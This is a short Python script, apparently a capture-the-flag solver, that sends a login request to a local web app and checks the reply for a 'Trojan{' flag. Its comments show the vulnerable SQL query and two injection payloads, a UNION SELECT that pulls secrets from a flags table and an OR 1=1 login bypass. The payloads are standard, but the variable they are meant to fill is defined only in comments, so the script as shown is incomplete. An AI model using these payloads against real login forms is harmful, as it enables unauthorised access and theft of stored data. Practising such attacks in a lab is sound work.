import requests

hostname = 'http://localhost:5000'

# SELECT * FROM users WHERE username='{username}' AND password='{password}'
# username = 'XYZ\' UNION SELECT secret,"1",1,1 FROM flags;--'
# username = 'xyz\' OR 1=1;--'
password = 'def'
r = requests.post(f'{hostname}/login', data={'username': username, 'password': password})
print(r.text)
if 'Trojan{' not in r.text:
    raise ValueError("no flag found")